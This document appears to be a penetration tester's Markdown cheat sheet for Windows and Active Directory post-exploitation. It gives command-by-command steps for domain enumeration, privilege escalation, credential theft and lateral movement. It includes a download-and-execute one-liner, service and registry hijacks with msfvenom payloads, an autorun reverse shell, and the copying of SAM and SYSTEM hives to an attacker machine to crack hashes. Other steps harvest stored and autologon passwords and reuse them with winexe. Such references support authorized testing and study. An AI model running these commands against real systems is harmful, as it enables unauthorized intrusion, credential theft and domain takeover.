# Powershell post exploitation

## Enumeration

Get Current Domain: `Get-Domain`
Enumerate Other Domains: `Get-Domain -Domain <DomainName>`
Get Domain SID: `Get-DomainSID`

Get Domain Policy: 

`Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess`
`Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy`

Domain controllers:

`Get-DomainController`
`Get-DomainController -Domain <DomainName>`

Enumerate Domain Users

```
#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

Enumerate Domain Computers

```
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

Enumerate Groups and group members

```
#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member 
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

Enumerate Shares

```
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```

Enumerate Group Policies

```
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine's local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
```

Enumerate OUs

```
Get-DomainOU -Properties Name | Sort-Object -Property Name
```

Enumerate ACLs

```
# Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
```

Enumerate Domain Trust

```
Get-DomainTrust
Get-DomainTrust -Domain <DomainName>

#Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
Get-DomainTrustMapping
```

Enumerate Forest Trust

```
Get-ForestDomain
Get-ForestDomain -Forest <ForestName>

#Map the Trust of the Forest
Get-ForestTrust
Get-ForestTrust -Forest <ForestName>
```

User Hunting

```
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess
```

### Access Directory

Get Current Domain: `Get-ADDomain`
Enum Other Domains: `Get-ADDomain -Identity <Domain>`
Get Domain SID: `Get-DomainSID`

Get Domain Controllers

```
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```

Enumerate Domain Users

```
Get-ADUser -Filter * -Identity <user> -Properties *

#Get a spesific "string" on a user's attribute
Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
```

Enumerate Domain Computers

```
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * 
```

Enumerate Domain Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Forest Trust

```
Get-ADTrust -Filter *
Get-ADTrust -Identity <DomainName>
```

Enumerate Local Applocker Effective Policy `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

### Tools

[LDAP](https://github.com/dirkjanm/ldapdomaindump)
[AD](https://github.com/sense-of-security/ADRecon)
[DNS](https://github.com/dirkjanm/adidnsdump)
[Privilege Account Hunt](https://github.com/cyberark/ACLight)

## Privilege Escalation

### Common commands to use
`systeminfo`
`WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors`
`whoami `
`whoami /priv`
`Lookout for`

- SeDebugPrivilege
- SeRestorePrivilege
- SeBackupPrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateToken Privilege
- SeLoadDriver Privilege
- SeImpersonate & SeAssignPrimaryToken Priv.

`whoami /groups`
`net user`
`netstat -ano`
`ipconfig /all`
`route print`
`tasklist /SVC > tasks.txt`
`schtasks /query /fo LIST /v > schedule.txt`
`netsh advfirewall show currentprofile`
`netsh advfirewall firewall show rule name=all`
`wmic product get name, version, vendor > apps_versions.txt`
`DRIVERQUERY`
`mountvol`
`accesschk.exe /accepteula`
`accesschk.exe -uws "Everyone" "C:\Program Files"`
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`

Stored Credentials

If system is running an IIS web server the web.config file:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
`C:\inetpub\wwwroot\web.config`

Local administrators passwords can also retrieved via the Group Policy Preferences:

`C:\ProgramData\Microsoft\Group Policy\History????\Machine\Preferences\Groups\Groups.xml`

`????\SYSVOL\Policies????\MACHINE\Preferences\Groups\Groups.xml`

Except of the Group.xml file the cpassword attribute can be found in other policy preference files as well such as:

`Services\Services.xml`
`ScheduledTasks\ScheduledTasks.xml`
`Printers\Printers.xml`
`Drives\Drives.xml`
`DataSources\DataSources.xml`

Most Windows systems they are running McAfee as their endpoint protection. The password is stored encrypted in the SiteList.xml file:

`%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml`


### Unattended passwords


Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator. This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually. If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system. This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!

While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:

`C:\unattend.xml`
`C:\Windows\Panther\Unattend.xml`
`C:\Windows\Panther\Unattend\Unattend.xml`
`C:\Windows\system32\sysprep.inf`
`C:\Windows\system32\sysprep\sysprep.xml`

`If you find one open it and search for tag. Stored as plaintext or base64.`

### Kernel Exploits

WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

Use [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

Serlock

Config: Add to the last line the "Find-AllVulns"
Download and run Sherlock:

`echo IEX(New-Object Net.WebClient).DownloadString('http://:/Sherlock.ps1') | powershell -noprofile -`


### Applications and Drivers Exploits

wmic product get name, version, vendor > install_apps.txt

powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "VMware"}

driverquery /v > drivers.txt

### Insecure File or Folder Permissions

Always use https://download.sysinternals.com/files/AccessChk.zip to check the permissions.

Search for world writable files and directories:

`accesschk.exe -uws "Everyone" "C:\Progrma Files"`

`powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

Find running proccess:

`tasklist /SVC > tasks.txt`

`powershell: Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}`

### Unquoted Service Path

Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`

The next step is to try to identify the level of privilege that this service is running. This can be identified easily:

`sc qc "<service name>"`

### Always Install Elevated

If they return output then vulnerability exists:

`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

### Insecure Service Permissions

Detect is to find a service with weak permissions

`accesschk.exe -uwcqv *`

For Shorten output

`accesschk.exe -uwcqv "Authenticated Users" *`
`accesschk.exe -uwcqv "Everyone" *`

The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:

`SERVICE_CHANGE_CONFIG`
`SERVICE_ALL_ACCESS`
`GENERIC_WRITE`
`GENERIC_ALL`
`WRITE_DAC`
`WRITE_OWNER`

If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:

`sc config SERVICENAME binPath= "E:\Service.exe"`
`sc config SERVICENAME obj=".\LocalSystem" password=""`
`net stop SERVICENAME`
`net start SERVICENAME`

Stop and start the service again and you’re a Local Admin!

### Insecure Registry Permissions

Windows stores all the necessary data that is related to services in the registry key location below:

`reg query HKLM\SYSTEM\CurrentControlSet\Services`
 
If you find a vulnerable service use the follwing command to see its details:

`req query HKLM\SYSTEM\CurrentControlSet\Services\<servicename>`

Find from which group is accessible this service

`accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\<servicename>`

Found if note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users).

generate a payload:

`msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binary>`

Open a listener

Overweight the imagepath subkey of the valuable services with the path of the custom binary

`reg add HKLM\System\CurrentControleSet\Service<Service nam> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f`

start service:

`net start`

### Token Manipulation

whoami /priv

- SeDebugPrivilege
- SeRestorePrivilege
- SeBackupPrivilege
- SeTakeOwnershipPrivilege
- SeTcbPrivilege
- SeCreateToken Privilege
- SeLoadDriver Privilege
- SeImpersonate & SeAssignPrimaryToken Priv.

### Potatoes

#### Hot Potatoe

Takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

Affected systems: `Windows 7,8,10, Server 2008, Server 2012`
Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/
Usage: https://github.com/foxglovesec/Potato

#### Rotten Potatoe

Rotten Potato and its standalone variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges

Affected systems: `Windows 7,8,10, Server 2008, Server 2012, Server 2016`
Guide: 
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- https://0xdf.gitlab.io/2018/08/04/htb-silo.html

Usage: https://github.com/nickvourd/lonelypotato

`Rotten Potato from default opens meterpreter, use lonely potato which opens in line shell`

#### Juicy Potato

What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.

Affetcted Systems:
- Windows 7 Enterprise
- Windows 8.1 Enterprise
- Windows 10 Enterprise
- Windows 10 Professional
- Windows Server 2008 R2 Enterprise
- Windows Server 2012 Datacenter
- Windows Server 2016 Standard

Find CLSID here: https://ohpe.it/juicy-potato/CLSID/

`Warning: Juicy Potato doesn’t work in Windows Server 2019`

Guides:

https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges

https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.

Usage: https://github.com/ohpe/juicy-potato

### Autologon User Credentials

Use the following command and if return output take autologon user credentials from regisrty:

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`

### Autoruns

Find auto run executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`accesschk.exe /accepteula -wvu "\<path>\<file.exe>"`

copy a shell to auto run executable:

`copy <path>\<file.exe> "\<path>\<file.exe>" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.

`rdesktop <ip>`

### Passwords Registry

The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //ip_of_victim cmd.exe`

### Security Account Manager Passwords



Transfer the SAM and SYSTEM files to your Kali VM:

`copy C:\Windows\Repair\SAM \ip\kali\`
`copy C:\Windows\Repair\SYSTEM \ip\kali\`

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

`git clone https://github.com/Neohapsis/creddump7.git`
`sudo apt install python-crypto`
`python2 creddump7/pwdump.py SYSTEM SAM`

Crack the admin NTLM hash using hashcat:

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

## Lateral movement

### Powershell Remoting

```
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a powershell module and execute its functions remotely

```
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
```

### Executing Remote Stateful commands

```
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```


### Tools


[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
[BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
[Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
[FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges


# Credits

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#readme

https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet

















































































